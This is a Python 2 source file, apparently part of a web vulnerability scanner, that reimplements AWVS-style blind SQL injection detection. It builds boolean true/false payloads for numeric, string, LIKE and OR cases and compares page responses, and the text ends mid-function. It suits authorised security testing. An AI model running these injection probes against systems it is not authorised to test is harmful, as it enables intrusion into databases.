#!/usr/bin/env python
# coding=utf-8

"""
this script aim to rewrite the awvs blind sql injection script,
data: 18-04-23
author: jxy
"""

import sys
import random
import json
import difflib
import pymysql
import math
import re
from lib.common import *
from colorama import *
from bs4 import BeautifulSoup as bs

reload(sys)
sys.setdefaultencoding('utf-8')
"""
testInjectionWithOR还有点问题,
data: 2018/05/14
由 startTest() 函数开始，
    分别调用了： testBoolStartPoint、testTimingStartPoint来分别检测bool型与时延注入
        testBooleStartPoint调用了： testInjectionNumber、testInjection、testInjectionWithOR 来检测数字，混合的不稳定响应的情况
        testTimingStartPoint调用了： testTiming 来检测时延注入
            testTiming 检测返回的响应时间与payload的sleep是否相符，
            testInjectionNumber、testInjection、testInjectionWithOR, 调用 payload来请求， 检测响应中的值是否与原响应值相同， 调用 了filter_body函数
                filter_body： 过滤掉时间，与payload自身， TODO： 提取出标签的text值，减少因为服务器的callback中随机数的误报？
                                                        TODO： 宽字符注入，如何匹配html中的payload？

"""

# logger  = LogUtil()


class SQLInjectionTime(object):
    def __init__(self, url, headers, data=None):
        self.method = 'POST' if data else 'GET' # method
        self.data = data # post data
        self.isjson = is_json(data)  # is json format
        if isinstance(url, TURL):
            self.url = url
        else:
            self.url = TURL(url)

        self.headers = headers
        if self.method == 'GET':
            self.orivalue = self.url.get_dict_query.copy()
        else:
            # if post data
            if self.isjson:
                self.orivalue = json.loads(self.data)
            else:
                self.orivalue = dict(urlparse.parse_qsl(self.data))
        # dict value keys
        # if self.orivalue == {}:
        #     return
        self.orivalue_keys = self.orivalue.keys()
        # map the param key to 1,2,3
        self.variations = dict(zip(xrange(len(self.orivalue_keys)), self.orivalue_keys))

        if self.isjson:
            self.headers['Content-Type'] = 'application/json'
        self.hj = THTTPJOB(url, method=self.method, headers=self.headers, data=self.data, is_json=self.isjson)

        # init the shortDuration and longDuration
        self.shortDuration = 2
        self.longDuration = 6

        logger.info('URL: {}'.format(self.url))
        logger.info('OrigValue: {}'.format(repr(self.orivalue)))



    def checkIfResponseIsStable(self, varIndex):
        # test if the response is time statble
        time1 = 0
        time2 = 0
        body1 = ""
        body2 = ""
        status_code, headers, html, time_used = self.hj.request()
        self.origBody = body1
        if status_code == -1:
            return False
        if self.hj.ConnectionErrorCount > 0:
            return False
        param_value = self.orivalue[self.variations[varIndex]]
        #logger.info("param_value={}".format(param_value))
        body1 = self.filter_body(html, param_value)
        time1 = time_used
        self.origBody = body1
        # 第二次请求原始值
        status_code, headers, html, time_used = self.hj.request()
        if status_code == -1:
            return False
        if self.hj.ConnectionErrorCount > 0:
            return False
        body2 = self.filter_body(html, param_value)
        time2 = time_used

        # 通过判断响应时间来看是否稳定
        min_time = min(time1, time2)
        max_time = max(time1, time2)
        self.shortDuration = max(self.shortDuration, max_time) + 1
        self.longDuration = self.shortDuration * 2

        # 判断响应时间稳定的条件
        if(max_time - min_time > self.shortDuration): self.responseTimeIsStable = False
        else: self.responseTimeIsStable = True


        # 判断响应内容
        if(body2 != body1):
            logger.debug("len(body1)={} and len(body2)={}".format(len(body1), len(body2)))
            self.responseIsStable =False
            return True
        else:
            self.responseIsStable = True

        # 检测返回是否为空
        if (len(body1) == 0):
            self.inputIsStable = False
            return True

        # 如果inputIsStable和responseIsStable 为True, 发送一个随机串
        new_value = random_str()
        new_param_dict = self.orivalue.copy()
        new_param_dict[self.variations[varIndex]] = new_value
        if self.method == 'GET':
            self.hj.url.get_dict_query = new_param_dict
        else:
            if self.isjson:
                self.hj.data = json.dumps(new_param_dict)
            else:
                self.hj.data = (new_param_dict)
        status_code, headers, html, time_used = self.hj.request()
        # 恢复原来的参数值
        self.hj.request_param_dict = self.orivalue
        if status_code == -1:
            return False
        if self.hj.ConnectionErrorCount > 0:
            return False
        body3 = self.filter_body(html, param_value)
        # 判断响应是否稳定的
        if (body1 == body2 and body1 != body3):
            self.inputIsStable = True
        else:
            self.inputIsStable = False

        return True

    def filter_body(self, body, param_value):
        # filter the variable in body
        # awvs 还有一个extractTextFromBody, 暂时先不写， 推测可能是从标签中获取text，可以用beautifulSoup来实现
        # filter the text use bs4
        # try:
        #     soup = bs(body, 'html.parser')
        #     clean_body = ''
        #     # get a tag text
        #     for a_tag in soup.find_all('a'):
        #         clean_body += a_tag.get_text()

        #     # get p tag text
        #     for a_tag in soup.find_all('p'):
        #         clean_body += a_tag.get_text()

        #     for a_tag in soup.find_all('textarea'):
        #         clean_body += a_tag.get_text()

        #     for a_tag in soup.find_all('input'):
        #         clean_body += a_tag.get_text()

        #     for a_tag in soup.find_all('span'):
        #         clean_body += a_tag.get_text()

        #     # for a_tag in soup.find_all('div'):
        #     #     clean_body += a_tag.get_text()

        #     for h in ['h1', 'h2', 'h3', 'h4', 'h5', 'h6']:
        #         for a_tag in soup.find_all(h):
        #             clean_body += a_tag.get_text()

        # except Exception as e:
        #     logger.error("Parse The HTML Error For Rason={}".format(repr(e)))

        # 过滤掉时间
        body = re.sub(r'([0-1]?[0-9]|[2][0-3]):([0-5][0-9])[.|:]([0-9][0-9])', '', body)
        body = re.sub(r'time\s*[:]\s*\d+\.?\d*', '', body)
        # 过滤掉
        # param_value = self.orivalue[self.variations[varIndex]]
        #if len(str(param_value)) > 4:
        try:
            body = urllib.unquote(body)
        except:
            body = body
        if len(param_value) > 4:
            body = body.replace(param_value, '')
            body = body.replace(param_value.replace(' ', '+'), '')
            body = body.replace(urllib.quote(param_value), '')
            #logger.info('before len(body)={}'.format((body)))
            body = body.replace(urllib.quote(param_value).replace('%20', '+'), '')
            body = body.replace(urllib.quote(param_value).replace('%3D', '='), '')
            body = body.replace(urllib.quote(param_value).replace('%3D', '=').replace('%20', '+'), '')
            #body = body.replace(param_value, '')
            body = body.replace(pymysql.escape_string(param_value), '')
            body = body.replace(pymysql.escape_string(param_value.replace(' ', '+')), '')
            body = body.replace(pymysql.escape_string(urllib.quote(param_value)), '')
            #logger.info('before len(body)={}'.format((body)))
            body = body.replace(pymysql.escape_string(urllib.quote(param_value).replace('%20', '+')), '')
            body = body.replace(pymysql.escape_string(urllib.quote(param_value).replace('%3D', '=')), '')
            body = body.replace(pymysql.escape_string(urllib.quote(param_value).replace('%3D', '=').replace('%20', '+')), '')
            #logger.info('after len(body)={}'.format(len(body)))
        else:
            logger.error("param_value = {} & len(param_value) = {}".format(param_value, len(param_value)))

        return body

    def testInjection(self, varIndex, quoteChar, likeInjection):
        confirmed = False
        confirmResult = False
        while True:
            confirmResult = self.confirmInjection(varIndex, quoteChar, likeInjection, confirmed)
            logger.info("confirmResult={}".format(confirmResult))

            if (not confirmResult):
                # print "!!!!!!!!!!!!!!!!!!!!!!!!!"
                return False

            if confirmed:
                break
            else:
                confirmed = True
        return True

    def testInjectionNumber(self, varIndex, quoteChar, likeInjection):
        confirmed = False
        confirmResult = False
        while True:
            confirmResult = self.confirmInjectionNumber(varIndex, quoteChar, likeInjection, confirmed)
            logger.info("confirmResult={}".format(confirmResult))

            if (not confirmResult):
                # print "!!!!!!!!!!!!!!!!!!!!!!!!!"
                return False

            if confirmed:
                break
            else:
                confirmed = True
        return True

    def testInjectionWithOR(self, varIndex, quoteChar, dontCommentRestOfQuery):
        # 如果响应不稳定， 可以过or来做测试
        confirmed = False
        confirmResult = False
        while True:
            confirmResult = self.confirmInjectionWithOR(varIndex, quoteChar, confirmed, dontCommentRestOfQuery)
            logger.info("confirmResult={}".format(confirmResult))

            if (not confirmResult):
                print "!!!!!!!!!!!!!!!!!!!!!!!!!"
                return False

            if confirmed:
                break
            else:
                confirmed = True
        return True

    def confirmInjection(self, varIndex, quoteChar, likeInjection, confirmed):
        # awvs confirm injection rewrite
        origValue = self.orivalue.copy()
        # origValue
        # 原始响应
        origBody = self.origBody

        # difflib compare the response

        # 测试的响应
        testBody = ""
        paramValue = ""

        # 暂时不知道如何使用
        self.confirmInjectionHistory = False
        randNum = 10 + int(math.floor(random.random() * 989))
        randStr = random_str(length=4)

        if (confirmed): randStr = '0000' + randStr
        # numberic
        # if (num):
        #   randStr = randNum

        equalitySign = "="
        likeStr = ""

        if (likeInjection):
            likeStr = '%'
            equalitySign = '!='

        # 先不管数字型的，只看字符
        hasbrackets = True if quoteChar.find(')') > -1  else False
        prefix_payload = ''
        if not hasbrackets:
            payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 AND " +  '\'' + randStr + '\'' + equalitySign + quoteChar  + randStr  + likeStr
        else:
            prefix_payload = quoteChar[:quoteChar.find(')')]
            payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        # 生成payload
        logger.info("payload1= {}".format(repr(payload1)))
        paramValue = self.get_request_payload(origValue, varIndex, payload1)
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            logger.info('has error??????')
            return False

        logger.info('origValue={}'.format(origValue))
        #logger.info('self.variations={}'.format(self.variations))
        testBody = self.filter_body(html, payload1)
        logger.info('paramValue[self.variations] = {}'.format(paramValue[self.variations[varIndex]].replace(origValue[self.variations[varIndex]], '')))
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
        if testBody != origBody:
            #logger.info('paramValue')
            #logger.info('testBody!=origBody')
            # logger.info('{}'.format(testBody))
            # logger.info('------------------------------')
            # logger.info('{}'.format(origBody))
            return False

        # add to confirmInjectionHistory

        # 测试假值
        if not hasbrackets:
            payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload2= {}".format(payload2))
        paramValue = self.get_request_payload(origValue, varIndex, payload2)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload2)
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() > 0.99:
        if testBody == origBody:
            return False

        # add to confirmInjectionHistory
        # 再测一个假值
        if not hasbrackets:
            payload3 = likeStr + quoteChar + " AND 3*3<(2*4) AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload3 = likeStr + quoteChar + " AND 3*3<(2*4) AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload3= {}".format(payload3))
        paramValue = self.get_request_payload(origValue, varIndex, payload3)
        logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload3)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() > 0.99:
            return False

        # add to confirmInjectionHistory
        if not hasbrackets:
            payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload4= {}".format(payload4))
        paramValue = self.get_request_payload(origValue, varIndex, payload4)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            logger.info("AT payload4 Error Happend: {}".format(repr(e)))
            return False

        testBody = self.filter_body(html, payload4)
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
        if testBody != origBody:
            logger.info('{}'.format(testBody))
            logger.info('------------------------------')
            logger.info('{}'.format(origBody))
            return False
        # and to conrimInjecitionHistory

        # 测试真值
        if not hasbrackets:
            payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload5= {}".format(payload5))
        paramValue = self.get_request_payload(origValue, varIndex, payload5)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload5)
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
        if testBody != origBody:
            return False
        # and to conrimInjecitionHistory

        # 然后再测假值
        if not hasbrackets:
            payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload6= {}".format(payload6))
        paramValue = self.get_request_payload(origValue, varIndex, payload6)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload6)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
            return False
        # and to conrimInjecitionHistory


        # do some common test
        # common test 真值
        if not hasbrackets:
            payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload7= {}".format(payload7))
        paramValue = self.get_request_payload(origValue, varIndex, payload7)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload7)
        if testBody != origBody:

        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
            return False
        # add to confirmInjectionHistory

        # common test 假值
        if not hasbrackets:
            payload8 = likeStr + quoteChar + " AND 5*4=21 AND "+ '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload8= {}".format(payload8))
        paramValue = self.get_request_payload(origValue, varIndex, payload8)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload8)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
            return False
        # and to conrimInjecitionHistory

        # 假值
        if not hasbrackets:
            payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload9= {}".format(payload9))
        paramValue = self.get_request_payload(origValue, varIndex, payload9)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload9)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
            return False
        # and to conrimInjecitionHistory

        # 真值
        if not hasbrackets:
            payload10 = likeStr + quoteChar + " AND 7*7>48 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload10 = likeStr + quoteChar + " AND 7*7>48 AND " +  '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload10= {}".format(payload10))
        paramValue = self.get_request_payload(origValue, varIndex, payload10)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload10)
        if testBody != origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
            return False

        # 假值
        if not hasbrackets:
            payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND "+ '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload11= {}".format(payload11))
        paramValue = self.get_request_payload(origValue, varIndex, payload11)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload11)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
            return False
        # and to conrimInjecitionHistory

        # 真值
        if not hasbrackets:
            payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
        else:
            payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
        logger.info("payload12= {}".format(payload12))
        paramValue = self.get_request_payload(origValue, varIndex, payload12)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload12)
        if testBody != origBody:

        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
            return False

        # logger.info("test if here")
        return paramValue


    def confirmInjectionNumber(self, varIndex, quoteChar, likeInjection, confirmed):
        # test the number injection
        # awvs confirm injection rewrite
        origValue = self.orivalue.copy()
        # origValue
        # 原始响应
        origBody = self.origBody

        # difflib compare the response

        # 测试的响应
        testBody = ""
        paramValue = ""

        # 暂时不知道如何使用
        self.confirmInjectionHistory = False
        randNum = 10 + int(math.floor(random.random() * 989))
        randStr = random_str(length=4)

        if (confirmed): randStr = '0000' + randStr
        # numberic
        # if (num):
        #   randStr = randNum

        equalitySign = "="
        likeStr = ""

        if (likeInjection):
            likeStr = '%'
            equalitySign = '!='

        # 先不管数字型的，只看字符
        hasbrackets = True if quoteChar.find(')') > -1  else False

        payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 -- "

        # 生成payload
        logger.info("payload1= {}".format(repr(payload1)))
        paramValue = self.get_request_payload(origValue, varIndex, payload1)
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            logger.info('has error??????')
            return False

        logger.info('origValue={}'.format(origValue))
        #logger.info('self.variations={}'.format(self.variations))
        testBody = self.filter_body(html, payload1)
        # logger.info('paramValue[self.variations] = {}'.format(paramValue[self.variations[varIndex]].replace(origValue[self.variations[varIndex]], '')))
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
        if testBody != origBody:
            #logger.info('paramValue')
            #logger.info('testBody!=origBody')
            # logger.info('{}'.format(testBody))
            # logger.info('------------------------------')
            # logger.info('{}'.format(origBody))
            return False

        # add to confirmInjectionHistory

        # 测试假值

        payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 -- "

        logger.info("payload2= {}".format(repr(payload2)))
        paramValue = self.get_request_payload(origValue, varIndex, payload2)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload2)
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() > 0.99:
        if testBody == origBody:
            return False

        # add to confirmInjectionHistory
        # 再测一个假值

        payload3 = likeStr + quoteChar + " AND 3*3<(2*4) -- "

        logger.info("payload2= {}".format(repr(payload3)))
        paramValue = self.get_request_payload(origValue, varIndex, payload3)
        # logger.debug("paramValue= {}".format(paramValue))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False


        testBody = self.filter_body(html, payload3)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() > 0.99:
            return False

        # add to confirmInjectionHistory

        payload4 = likeStr + quoteChar + " AND 3*2>(1*5) -- "
        logger.info("payload2= {}".format(repr(payload4)))
        paramValue = self.get_request_payload(origValue, varIndex, payload4)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False


        testBody = self.filter_body(html, payload4)
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
        if testBody != origBody:
            return False
        # and to conrimInjecitionHistory

        # 测试真值

        payload5 = likeStr + quoteChar + " AND 3*2*0>=0 -- "
        logger.info("payload2= {}".format(repr(payload5)))
        paramValue = self.get_request_payload(origValue, varIndex, payload5)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False


        testBody = self.filter_body(html, payload5)
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
        if testBody != origBody:
            return False
        # and to conrimInjecitionHistory

        # 然后再测假值

        payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) -- "
        logger.info("payload2= {}".format(repr(payload6)))
        paramValue = self.get_request_payload(origValue, varIndex, payload6)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False


        testBody = self.filter_body(html, payload6)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
            return False
        # and to conrimInjecitionHistory


        # do some common test
        # common test 真值

        payload7 = likeStr + quoteChar + " AND 5*4=20 -- "

        logger.info("payload2= {}".format(repr(payload7)))
        paramValue = self.get_request_payload(origValue, varIndex, payload7)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False


        testBody = self.filter_body(html, payload7)
        if testBody != origBody:

        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
            return False
        # add to confirmInjectionHistory

        # common test 假值

        payload8 = likeStr + quoteChar + " AND 5*4=21 -- "

        logger.info("payload2= {}".format(repr(payload8)))
        paramValue = self.get_request_payload(origValue, varIndex, payload8)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False


        testBody = self.filter_body(html, payload8)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
            return False
        # and to conrimInjecitionHistory

        # 假值

        payload9 = likeStr + quoteChar + " AND 5*6<26 -- "

        logger.info("payload2= {}".format(repr(payload9)))
        paramValue = self.get_request_payload(origValue, varIndex, payload9)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False


        testBody = self.filter_body(html, payload9)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
            return False
        # and to conrimInjecitionHistory

        # 真值

        payload10 = likeStr + quoteChar + " AND 7*7>48 -- "

        logger.info("payload2= {}".format(repr(payload10)))
        paramValue = self.get_request_payload(origValue, varIndex, payload10)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload10)
        if testBody != origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
            return False

        # 假值

        payload11 = likeStr + quoteChar + " AND 3*2*0=6 -- "

        logger.info("payload2= {}".format(repr(payload11)))
        paramValue = self.get_request_payload(origValue, varIndex, payload11)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False


        testBody = self.filter_body(html, payload11)
        if testBody == origBody:
        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
            return False
        # and to conrimInjecitionHistory

        # 真值

        payload12 = likeStr + quoteChar + " AND 3*2*1=6 -- "

        logger.info("payload2= {}".format(repr(payload12)))
        paramValue = self.get_request_payload(origValue, varIndex, payload12)

        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, payload12)
        if testBody != origBody:

        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
            return False

        # logger.info("test if here")
        return paramValue


    def get_request_payload(self, origValue, varIndex, payload, initvalue=False):
        if isinstance(payload, list):
            pass
        else:
            payload = [payload,]

        tmpOrigValue = origValue.copy()
        # logger.info("tmpOrigValue={}".format(repr(tmpOrigValue)))
        # logger.info("self.variations={}".format(repr(self.variations)))
        tmpQueryKey = self.variations[varIndex]
        # logger.info("tmpQueryKey={}".format(tmpQueryKey))
        if initvalue:
            tmpOrigValue = {tmpQueryKey: '-1'}
        else:
            tmpQueryDict = {tmpQueryKey: tmpOrigValue.pop(tmpQueryKey)}
        # logger.info("temQueryDict={}".format(repr(tmpQueryDict)))
        # logger.info("tmpOrigValue={}".format(repr(tmpOrigValue)))
        tmpQueryStr = urllib.urlencode(tmpQueryDict)
        payload1 = Pollution(tmpQueryStr, payload, replace=False).payload_generate()
        # logger.info("payload1={}".format(repr(payload1)))
        # print payload1[0]
        # print tmpOrigValue
        # print payload1[0].update(tmpOrigValue)
        payload = payload1[0]
        payload.update(tmpOrigValue)
        # logger.info("payload={}".format(payload))
        return payload


    def confirmInjectionWithOR(self, varIndex, quoteChar, confirmed, dontCommentRestOfQuery):
        # 将所有值设置为-1
        # awvs confirm injection rewrite
        origValue = self.orivalue.copy()
        # origValue
        origValue[self.variations[varIndex]] = "-1"
        # 原始响应
        origBody = self.origBody

        # 测试的响应
        testBody = ""
        paramValue = ""

        # 暂时不知道如何使用
        self.confirmInjectionHistory = False
        randNum = 10 + int(math.floor(random.random() * 989))
        randNum = str(randNum)
        randStr = randNum

        if (confirmed): randStr = '0000' + randStr
        # numberic
        # if (num):
        #   randStr = randNum

        equalitySign = "="

        # test TRUE
        payload1 = quoteChar + " OR 2+" + randNum + "-" + randNum + "-1=0+0+0+1 -- "
        if dontCommentRestOfQuery:
            payload1 = payload1[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload1)
        logger.debug("paramValue1= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == origBody:
            return False
        # add to confirm InjectionHistory

        # 保存上一次的TRUE值返回体
        trueBody = testBody

        # test False
        payload2 = quoteChar + " OR 3+" + randNum + "-" + randNum + "-1=0+0+0+1 -- "
        if dontCommentRestOfQuery:
            payload1 = payload2[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload2)
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False
        # add  to confirmInjectionHistory

        # test False
        payload3 = quoteChar + " OR 3*2<(0+5+" + randNum + "-" + randNum + ") -- "
        if dontCommentRestOfQuery:
            payload1 = payload3[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload3)
        #logger.debug("paramValue= {}".format(paramValue))
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False

        # test True
        payload4 =  quoteChar + " OR 3*2>(0+5+" + randNum + "-" + randNum + ") -- "
        if dontCommentRestOfQuery:
            payload1 = payload4[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload4)
        #logger.debug("paramValue= {}".format(paramValue))
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
